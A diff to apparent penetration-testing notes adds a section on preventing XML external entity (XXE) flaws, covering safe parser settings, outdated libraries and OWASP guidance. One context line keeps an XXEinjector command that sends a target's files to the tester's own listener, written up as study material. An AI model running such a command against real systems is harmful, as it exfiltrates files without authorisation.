@@ -968,3 +968,34 @@ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=
 
 all exfiltrated files get store din the `Logs` folder under the tool which we can view to see the output 
 
+## XXE Prevention 
+
+most XXE vulnerabilities occur when an unsafe XML input references an external entity, which is then used to read sensitive files and perform other actions 
+
+preventing XXE vulnerabilities is typically easier because they are caused by outdated XML libraries 
+
+### Avoiding outdated components 
+
+secure coding practices are usually what solve other web vulnerabilities, but not always the case for XXE because XML is usually not handled manually by the developers but by built-in XML libraries instead   
+
+for example, PHP's [libxml_disable_entity_loader](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) function is deprecated since it allows a developer to enable external entities in an unsafe manner   
+
+[OWASP's XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php)
+
+we should also update any components that parse XML input such as API libraries like SOAP   
+any document or file processors that may perform XML parsing like SVG image processors or PDF document processors can also be vulnerable 
+
+### Using save XML configurations 
+
+certain xml configs can reduce the possibility of XXE: 
+- disable referencing custom document type definitions (DTD)
+- disable referencing external XML entities 
+- disable parameter entity processing 
+- disable support for XInclude
+- prevent entity reference loops 
+
+another thing to look out for is having proper exception handling and preventing runtime errors from being output 
+
+many people will simply recommend not using XML and instead just use JSON or YAML, which also includes avoiding API standards like SOAP that rely on XML   
+
+finally, using WAFs will also protect against XXE vulnerabilities 
